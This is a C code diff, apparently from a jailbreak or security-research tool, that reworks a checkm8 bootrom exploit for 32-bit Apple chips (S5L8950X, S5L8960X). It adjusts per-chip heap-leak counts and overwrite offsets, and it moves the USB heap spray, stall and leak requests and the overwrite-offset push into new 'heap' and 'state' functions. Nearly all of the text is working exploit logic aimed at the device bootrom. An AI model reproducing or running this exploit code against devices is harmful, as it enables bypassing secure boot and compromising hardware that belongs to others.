@@ -39,7 +39,25 @@ static int empty(void){
 
 
 // usb
-unsigned char blank_buf[0x100];
+struct irecv_client_private {
+    int debug;
+    int usb_config;
+    int usb_interface;
+    int usb_alt_interface;
+    unsigned int mode;
+    struct irecv_device_info device_info;
+    IOUSBDeviceInterface320 **handle;
+    IOUSBInterfaceInterface300 **usbInterface;
+    irecv_event_cb_t progress_callback;
+    irecv_event_cb_t received_callback;
+    irecv_event_cb_t connected_callback;
+    irecv_event_cb_t precommand_callback;
+    irecv_event_cb_t postcommand_callback;
+    irecv_event_cb_t disconnected_callback;
+};
+
+
+unsigned char blank_buf[0x800];
 
 static int usb_req_stall(irecv_client_t client){
     return irecv_usb_control_transfer(client, 0x2, 3, 0x0, 0x80, NULL, 0, 10);
@@ -74,7 +92,7 @@ static int send_data(irecv_client_t client, unsigned char* data, size_t size){
 static int get_exploit_configuration(uint16_t cpid, checkm8_32_t* config) {
     switch(cpid) {
         case 0x8950:
-            config->large_leak = 659;
+            config->large_leak = 659+5;
             config->overwrite_offset = 0x640;
             config->overwrite = S5l8950X_OVERWRITE;
             config->overwrite_len = 28;
@@ -86,7 +104,7 @@ static int get_exploit_configuration(uint16_t cpid, checkm8_32_t* config) {
             config->overwrite_len = 28;
             return 0;
         case 0x8960:
-            config->large_leak = 7936;
+            config->large_leak = 7942;
             config->overwrite_offset = 0x580;
             config->overwrite = S5l8960X_OVERWRITE;
             config->overwrite_len = 0x30;
@@ -97,6 +115,113 @@ static int get_exploit_configuration(uint16_t cpid, checkm8_32_t* config) {
     }
 }
 
+
+
+static int heap(irecv_client_t client, uint16_t cpid, checkm8_32_t config){
+    int r;
+    
+    DEBUG_("\x1b[36mheap spray\x1b[39m\n");
+    r = usb_req_stall(client);
+    if(r != IRECV_E_PIPE) {
+        printf("\x1b[31mERROR: Failed to stall pipe.\x1b[39m\n");
+        irecv_close(client);
+        return -1;
+    }
+    usleep(100);
+    
+    if(cpid == 0x8960){
+        for(int i = 0; i < config.large_leak; i++) {
+            r = usb_req_leak_fast(client);
+        }
+    } else {
+        for(int i = 0; i < config.large_leak; i++) {
+            r = usb_req_leak(client);
+            if(r != IRECV_E_TIMEOUT) {
+                printf("\x1b[31mERROR: Failed to create heap hole.\x1b[39m\n");
+                irecv_close(client);
+                return -1;
+            }
+        }
+    }
+    
+    r = usb_req_no_leak(client);
+    if(r != IRECV_E_TIMEOUT) {
+        printf("\x1b[31mERROR: Failed to create heap hole.\x1b[39m\n");
+        irecv_close(client);
+        return -1;
+    }
+    
+    return 0;
+}
+
+static int state(irecv_client_t client, uint16_t cpid, checkm8_32_t config){
+    int r;
+    
+    unsigned char buf[0x800] = { 'A' };
+    
+    int a;
+    int sent;
+    int newVal;
+    int maxVal;
+    
+    a = 0; // retry
+    maxVal = config.overwrite_offset;
+    if(cpid == 0x8960){
+        maxVal += 0xc0;
+    }
+    
+    DEBUG_("\x1b[36mPreparing for overwrite\x1b[39m\n");
+    usleep(1000);
+    sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, 100);
+    
+    DEBUG_("\x1b[37msent: %x\x1b[39m\n", sent);
+    while(sent >= maxVal || sent < 0 || (sent % 0x40) != 0x0){
+        a++;
+        DEBUG_("\x1b[37mretry: %d\x1b[39m\n", a);
+        usleep(1000);
+        irecv_usb_control_transfer(client, 0x21, 1, 0, 0, buf, 64, 100);
+        usleep(1000);
+        sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, 100);
+        DEBUG_("\x1b[37msent: %x\x1b[39m\n", sent);
+    }
+    
+    if(cpid == 0x8960){
+        newVal = config.overwrite_offset;
+        if(sent == 0x00) newVal += 0x40;
+        if(sent == 0x40) newVal += 0;
+        if(sent == 0x80) newVal -= 0x40;
+        if(sent >= 0xc0) newVal += (0xc0-sent);
+    } else {
+        newVal = config.overwrite_offset - sent;
+    }
+    
+    DEBUG_("\x1b[37mnewval: %x\x1b[39m\n", newVal);
+    
+    DEBUG_("\x1b[36mpushing forward overwrite offset\x1b[39m\n");
+    r = irecv_usb_control_transfer(client, 0, 0, 0, 0, buf, newVal, 100);
+    
+    if(r != IRECV_E_PIPE) {
+        printf("\x1b[31mERROR: Failed to push forward overwrite offset.\x1b[39m\n");
+        irecv_close(client);
+        return -1;
+    }
+    
+    usleep(100);
+    
+    // heap spray
+    if(heap(client, cpid, config) != 0) {
+        printf("\x1b[31mERROR: Failed to heap spray.\x1b[39m\n");
+        return -1;
+    }
+    
+    r = irecv_usb_control_transfer(client, 0x21, 4, 0, 0, NULL, 0, 0);
+    usleep(100);
+    
+    // ReEnumerate
+    (*client->handle)->USBDeviceReEnumerate(client->handle, 0);
+    
+    return 0;
+}
 
 // exploit
 int checkm8_32_exploit(irecv_client_t client, irecv_device_t device_info, const struct irecv_device_info *info) {
@@ -139,120 +264,12 @@ int checkm8_32_exploit(irecv_client_t client, irecv_device_t device_info, const 
         irecv_close(client);
         return -1;
     }
+
+    r = state(client, chipid, config);
     
-    DEBUG_("\x1b[36mGrooming heap\x1b[39m\n");
-    r = usb_req_stall(client);
-    if(r != IRECV_E_PIPE) {
-        printf("\x1b[31mERROR: Failed to stall pipe.\x1b[39m\n");
-        irecv_close(client);
-        return -1;
-    }
-    usleep(100);
-    if(chipid == 0x8960){
-        for(int i = 0; i < config.large_leak; i++) {
-            r = usb_req_leak_fast(client);
-        }
-    } else {
-        for(int i = 0; i < config.large_leak; i++) {
-            r = usb_req_leak(client);
-            if(r != IRECV_E_TIMEOUT) {
-                printf("\x1b[31mERROR: Failed to create heap hole.\x1b[39m\n");
-                irecv_close(client);
-                return -1;
-            }
-        }
-    }
-    
-    r = usb_req_no_leak(client);
-    if(r != IRECV_E_TIMEOUT) {
-        printf("\x1b[31mERROR: Failed to create heap hole.\x1b[39m\n");
-        irecv_close(client);
-        return -1;
-    }
-    
-    irecv_reset(client);
-    
-    irecv_close(client);
-    client = NULL;
-    usleep(100);
-    irecv_open_with_ecid_and_attempts(&client, 0, 5);
-    if(!client) {
-        printf("\x1b[31mERROR: Failed to reconnect to device.\x1b[39m\n");
-        return -1;
-    }
-    
-    int a;
-    int sent;
-    int newVal;
-    int maxVal;
-    int timeout;
-    
-    a = 0;
-    maxVal = config.overwrite_offset;
-    
-    if(chipid == 0x8960){
-        maxVal += 0xc0;
-    }
-    
-    DEBUG_("\x1b[36mPreparing for overwrite\x1b[39m\n");
-    usleep(1000);
-    sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, 100);
-    
-    DEBUG_("\x1b[37msent: %x\x1b[39m\n", sent);
-    while(sent >= maxVal || sent < 0 || (sent % 0x40) != 0x0){
-        a++;
-        DEBUG_("\x1b[37mretry: %d\x1b[39m\n", a);
-        usleep(1000);
-        irecv_usb_control_transfer(client, 0x21, 1, 0, 0, buf, 64, 100);
-        usleep(1000);
-        sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, 100);
-        DEBUG_("\x1b[37msent: %x\x1b[39m\n", sent);
-    }
-    
-    if(chipid == 0x8960){
-        timeout = 100;
-        newVal = config.overwrite_offset;
-        if(sent == 0){
-            newVal += 0x40;
-        }
-        if(sent == 0x40){
-            newVal += 0;
-        }
-        if(sent == 0x80){
-            newVal -= 0x40;
-        }
-        if(sent >= 0xc0){
-            newVal += 0xc0;
-            newVal -= sent;
-        }
-    } else {
-        timeout = 10;
-        newVal = config.overwrite_offset - sent;
-    }
-    
-    DEBUG_("\x1b[37mnewval: %x\x1b[39m\n", newVal);
-    
-    DEBUG_("\x1b[36mpushing forward overwrite offset\x1b[39m\n");
-    r = irecv_usb_control_transfer(client, 0, 0, 0, 0, buf, newVal, timeout);
-    
-    if(r != IRECV_E_PIPE) {
-        printf("\x1b[31mERROR: Failed to push forward overwrite offset.\x1b[39m\n");
-        irecv_close(client);
-        return -1;
-    }
-    
-    usleep(100);
-    
-    r = irecv_usb_control_transfer(client, 0x21, 4, 0, 0, NULL, 0, 0);
     if(r != 0) {
-        if (chipid == 0x8960){
-            // A7
-        }
-        else {
-            printf("\x1b[31mERROR: Failed to send abort.\x1b[39m\n");
-            irecv_close(client);
-            return -1;
-        }
+        printf("\x1b[31mERROR: Failed to set 1st stage.\x1b[39m\n");
+        return -1;
     }
     
     irecv_close(client);
